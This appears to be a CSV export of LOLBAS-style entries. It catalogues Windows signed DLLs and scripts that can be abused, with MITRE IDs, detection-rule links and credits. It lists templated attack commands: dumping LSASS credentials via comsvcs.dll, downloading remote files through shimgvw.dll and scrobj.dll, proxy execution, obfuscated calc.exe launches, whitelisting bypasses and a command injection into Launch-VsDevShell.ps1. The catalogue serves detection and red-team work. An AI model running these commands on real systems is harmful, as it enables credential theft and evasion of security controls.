"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_Download","Full_Path","Full_Path_Path","Detection","Detection_IOC","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_Tags_Execute","Resources","Resources_Link","Code_Sample","Code_Sample_Code","Detection_Sigma","Detection_Analysis","Detection_BlockRule","Commands_Tags_Requires","Commands_Tags_Input","Detection_Splunk","Detection_Elastic","Aliases","Aliases_Alias","Commands_Tags_Application","Commands_Tags_Type","is_legit"
"Launch-VsDevShell.ps1","Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet","Nasreddine Bencherchali","2022-06-13","","[''powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}''-|-''powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath ""/../../../../../; {PATH:.exe} ;""'']","[''Execute binaries from the context of the signed script using the ""VsWherePath"" flag.''-|-''Execute binaries and commands from the context of the signed script using the ""VsInstallationPath"" flag.'']","[''Proxy execution''-|-''Proxy execution'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1216''-|-''T1216'']","[''Windows 10, Windows 11''-|-''Windows 10, Windows 11'']","","","","[''C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\Tools\Launch-VsDevShell.ps1''-|-''C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\Launch-VsDevShell.ps1'']","","","","Nasreddine Bencherchali","@nas_bench","[''EXE''-|-''EXE'']","","https://twitter.com/nas_bench/status/1535981653239255040","","","https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_launch_vsdevshell.yml","","","","","","","","","","","false"
"CL_Invocation.ps1","Aero diagnostics script","Oddvar Moe","2018-05-25","",". C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke {CMD}","Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.","Proxy execution","Execute","User","T1216","Windows 10","","","","[''C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1''-|-''C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1''-|-''C:\Windows\diagnostics\system\WindowsUpdate\CL_Invocation.ps1'']","","","","[''Jimmy''-|-''Pierre-Alexandre Braeken'']","[''@bohops''-|-''@pabraeken'']","CMD","","","","","[''https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_cl_invocation.yml''-|-''https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_cl_invocation_lolscript.yml'']","","","","","","","","","","","false"
"CL_Mutexverifiers.ps1","Proxy execution with CL_Mutexverifiers.ps1","Oddvar Moe","2018-05-25","",". C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess {PATH:.ps1}","Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.","Proxy execution","Execute","User","T1216","Windows 10","","","","[''C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1''-|-''C:\Windows\diagnostics\system\Audio\CL_Mutexverifiers.ps1''-|-''C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1''-|-''C:\Windows\diagnostics\system\Video\CL_Mutexverifiers.ps1''-|-''C:\Windows\diagnostics\system\Speech\CL_Mutexverifiers.ps1'']","","","","Pierre-Alexandre Braeken","@pabraeken","PowerShell","","https://twitter.com/pabraeken/status/995111125447577600","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_cl_mutexverifiers.yml","","","","","","","","","","","false"
"CL_LoadAssembly.ps1","PowerShell Diagnostic Script","Jimmy (@bohops)","2021-09-26","","powershell.exe -ep bypass -command ""set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()""","Proxy execute Managed DLL with PowerShell","Execute proxied payload with Microsoft signed binary","Execute","User","T1216","Windows 10 21H1 (likely other versions as well), Windows 11","","","","C:\Windows\diagnostics\system\Audio\CL_LoadAssembly.ps1","","","","Jimmy","@bohops","DLL (.NET)","","https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/","","","https://github.com/SigmaHQ/sigma/blob/ff6c54ded6b52f379cec11fe17c1ccb956faa660/rules/windows/process_creation/proc_creation_win_lolbas_cl_loadassembly.yml","","","","","","","","","","","false"
"Comsvcs.dll","COM+ Services","LOLBAS Team","2019-08-30","","rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full","Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.","Dump Lsass.exe process memory to retrieve credentials.","Dump","SYSTEM","T1003.001","Windows 10, Windows 11","","","","c:\windows\system32\comsvcs.dll","","","","modexp","","","","https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/","","https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/","[''https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml''-|-''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml'']","","","","","https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/dump_lsass_via_comsvcs_dll.yml","https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml","","","","","false"
"Zipfldr.dll","Compressed Folder library","LOLBAS Team","2018-05-25","","[''rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}''-|-''rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e'']","[''Launch an executable payload by calling RouteTheCall.''-|-''Launch an executable payload by calling RouteTheCall (obfuscated).'']","[''Launch an executable.''-|-''Launch an executable.'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1218.011''-|-''T1218.011'']","[''Windows 10, Windows 11''-|-''Windows 10, Windows 11'']","","","","[''c:\windows\system32\zipfldr.dll''-|-''c:\windows\syswow64\zipfldr.dll'']","","","","[''Moriarty (Execution)''-|-''r0lan (Obfuscation)'']","[''@moriarty_meng''-|-''@r0lan'']","[''EXE''-|-''EXE'']","","[''https://twitter.com/moriarty_meng/status/977848311603380224''-|-''https://twitter.com/bohops/status/997896811904929792''-|-''https://windows10dll.nirsoft.net/zipfldr_dll.html'']","","","https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml","","","","","","","","","","","false"
"Url.dll","Internet Shortcut Shell Extension DLL.","LOLBAS Team","2018-05-25","","[''rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}''-|-''rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}''-|-''rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e''-|-''rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}''-|-''rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e''-|-''rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta'']","[''Launch a HTML application payload by calling OpenURL.''-|-''Launch an executable payload via proxy through a .url (information) file by calling OpenURL.''-|-''Launch an executable by calling OpenURL.''-|-''Launch an executable by calling FileProtocolHandler.''-|-''Launch an executable by calling FileProtocolHandler.''-|-''Launch a HTML application payload by calling FileProtocolHandler.'']","[''Invoke an HTML Application via mshta.exe (Default Handler).''-|-''Load an executable payload by calling a .url file.''-|-''Load an executable payload by specifying the file protocol handler (obfuscated).''-|-''Launch an executable.''-|-''Load an executable payload by specifying the file protocol handler (obfuscated).''-|-''Invoke an HTML Application via mshta.exe (Default Handler).'']","[''Execute''-|-''Execute''-|-''Execute''-|-''Execute''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''User''-|-''User''-|-''User''-|-''User'']","[''T1218.011''-|-''T1218.011''-|-''T1218.011''-|-''T1218.011''-|-''T1218.011''-|-''T1218.011'']","[''Windows 10, Windows 11''-|-''Windows 10, Windows 11''-|-''Windows 10, Windows 11''-|-''Windows 10, Windows 11''-|-''Windows 10, Windows 11''-|-''Windows 10, Windows 11'']","","","","[''c:\windows\system32\url.dll''-|-''c:\windows\syswow64\url.dll'']","","","","[''Adam (OpenURL)''-|-''Jimmy (OpenURL)''-|-''Malwrologist (FileProtocolHandler - HTA)''-|-''r0lan (Obfuscation)'']","[''@hexacorn''-|-''@bohops''-|-''@DissectMalware''-|-''@r0lan'']","[''HTA''-|-''URL''-|-''EXE''-|-''EXE''-|-''EXE''-|-''HTA'']","","[''https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/''-|-''https://twitter.com/DissectMalware/status/995348436353470465''-|-''https://twitter.com/bohops/status/974043815655956481''-|-''https://twitter.com/yeyint_mth/status/997355558070927360''-|-''https://twitter.com/Hexacorn/status/974063407321223168''-|-''https://windows10dll.nirsoft.net/url_dll.html'']","","","https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml","","","","","","","","","","","false"
"Syssetup.dll","Windows NT System Setup","LOLBAS Team","2018-05-25","","[''rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}''-|-''rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}'']","[''Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).''-|-''Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive.'']","[''Run local or remote script(let) code through INF file specification (Note May pop an error window).''-|-''Load an executable payload.'']","[''AWL Bypass''-|-''Execute'']","[''User''-|-''User'']","[''T1218.011''-|-''T1218.011'']","[''Windows 10, Windows 11''-|-''Windows 10, Windows 11'']","","","","[''c:\windows\system32\syssetup.dll''-|-''c:\windows\syswow64\syssetup.dll'']","","","","[''Pierre-Alexandre Braeken (Execute)''-|-''Matt harr0ey (Execute)''-|-''Jimmy (Scriptlet)'']","[''@pabraeken''-|-''@harr0ey''-|-''@bohops'']","[''INF''-|-''INF'']","","[''https://twitter.com/pabraeken/status/994392481927258113''-|-''https://twitter.com/harr0ey/status/975350238184697857''-|-''https://twitter.com/bohops/status/975549525938135040''-|-''https://windows10dll.nirsoft.net/syssetup_dll.html'']","","[''https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf''-|-''https://gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba#file-backdoor-minimalist-sct''-|-''https://gist.github.com/homjxi0e/87b29da0d4f504cb675bb1140a931415'']","https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml","","","","","https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___syssetup.yml","","","","","","false"
"Shimgvw.dll","Photo Gallery Viewer","Eral4m","2021-01-06","","rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}","Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.","Download file from remote location.","Download","User","T1105","Windows 10, Windows 11","","INetCache","","[''c:\windows\system32\shimgvw.dll''-|-''c:\windows\syswow64\shimgvw.dll'']","","Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://') on the command line","","Eral4m","@eral4m","","","https://twitter.com/eral4m/status/1479080793003671557","","","https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml","","","","","","","","","","","false"
"Shell32.dll","Windows Shell Common Dll","LOLBAS Team","2018-05-25","","[''rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}''-|-''rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}''-|-''rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}''-|-''rundll32.exe shell32.dll,#44 {PATH:.dll}'']","[''Launch a DLL payload by calling the Control_RunDLL function.''-|-''Launch an executable by calling the ShellExec_RunDLL function.''-|-''Launch command line by calling the ShellExec_RunDLL function.''-|-''Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function.'']","[''Load a DLL payload.''-|-''Run an executable payload.''-|-''Run an executable payload.''-|-''Load a DLL/CPL payload.'']","[''Execute''-|-''Execute''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''User''-|-''User'']","[''T1218.011''-|-''T1218.011''-|-''T1218.011''-|-''T1218.011'']","[''Windows 10, Windows 11''-|-''Windows 10, Windows 11''-|-''Windows 10, Windows 11''-|-''Windows 10, Windows 11'']","","","","[''c:\windows\system32\shell32.dll''-|-''c:\windows\syswow64\shell32.dll'']","","","","[''Adam (Control_RunDLL, Control_RunDLLNoFallback)''-|-''Pierre-Alexandre Braeken (ShellExec_RunDLL)''-|-''Matt Graeber (ShellExec_RunDLL)''-|-''Kyle Hanslovan (ShellExec_RunDLL)'']","[''@hexacorn''-|-''@pabraeken''-|-''@mattifestation''-|-''@KyleHanslovan'']","[''DLL''-|-''EXE''-|-''CMD''-|-''DLL'']","","[''https://twitter.com/Hexacorn/status/885258886428725250''-|-''https://twitter.com/pabraeken/status/991768766898941953''-|-''https://twitter.com/mattifestation/status/776574940128485376''-|-''https://twitter.com/KyleHanslovan/status/905189665120149506''-|-''https://windows10dll.nirsoft.net/shell32_dll.html''-|-''https://www.hexacorn.com/blog/2025/05/18/shell32-dll-44-lolbin/'']","","","https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml","","","","","https://github.com/splunk/security_content/blob/a1afa0fa605639cbef7d528dec46ce7c8112194a/detections/endpoint/rundll32_control_rundll_hunt.yml","","","","","","false"
"Shdocvw.dll","Shell Doc Object and Control Library.","LOLBAS Team","2018-05-25","","rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}","Launch an executable payload via proxy through a URL (information) file by calling OpenURL.","Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.","Execute","User","T1218.011","Windows 10, Windows 11","","","","[''c:\windows\system32\shdocvw.dll''-|-''c:\windows\syswow64\shdocvw.dll'']","","","","[''Adam''-|-''Jimmy'']","[''@hexacorn''-|-''@bohops'']","URL","","[''http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/''-|-''https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/''-|-''https://twitter.com/bohops/status/997690405092290561''-|-''https://windows10dll.nirsoft.net/shdocvw_dll.html'']","","https://gist.githubusercontent.com/bohops/89d7b11fa32062cfe31be9fdb18f050e/raw/1206a613a6621da21e7fd164b80a7ff01c5b64ab/calc.url","https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml","","","","","","","","","","","false"
"Setupapi.dll","Windows Setup Application Programming Interface","LOLBAS Team","2018-05-25","","[''rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}''-|-''rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}'']","[''Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).''-|-''Launch an executable file via the InstallHinfSection function and .inf file section directive.'']","[''Run local or remote script(let) code through INF file specification.''-|-''Load an executable payload.'']","[''AWL Bypass''-|-''Execute'']","[''User''-|-''User'']","[''T1218.011''-|-''T1218.011'']","[''Windows 10, Windows 11''-|-''Windows'']","","","","[''c:\windows\system32\setupapi.dll''-|-''c:\windows\syswow64\setupapi.dll'']","","","","[''Kyle Hanslovan (COM Scriptlet)''-|-''Huntress Labs (COM Scriptlet)''-|-''Casey Smith (COM Scriptlet)''-|-''Nick Carr (Threat Intel)'']","[''@KyleHanslovan''-|-''@HuntressLabs''-|-''@subTee''-|-''@ItsReallyNick'']","[''INF''-|-''INF'']","","[''https://github.com/huntresslabs/evading-autoruns''-|-''https://twitter.com/pabraeken/status/994742106852941825''-|-''https://windows10dll.nirsoft.net/setupapi_dll.html'']","","[''https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf''-|-''https://gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba#file-backdoor-minimalist-sct''-|-''https://gist.githubusercontent.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba/raw/6cb52b88bcc929f5555cd302d9ed848b7e407052/Backdoor-Minimalist.sct''-|-''https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf'']","[''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_rundll32_setupapi_installhinfsection.yml''-|-''https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml'']","","","","","https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___setupapi.yml","","","","","","false"
"Scrobj.dll","Windows Script Component Runtime","Eral4m","2021-01-07","","rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}","Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.","Download file from remote location.","Download","User","T1105","Windows 10, Windows 11","","INetCache","","[''c:\windows\system32\scrobj.dll''-|-''c:\windows\syswow64\scrobj.dll'']","","Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command line","","Eral4m","@eral4m","","","https://twitter.com/eral4m/status/1479106975967240209","","","https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml","","","","","","","","","","","false"
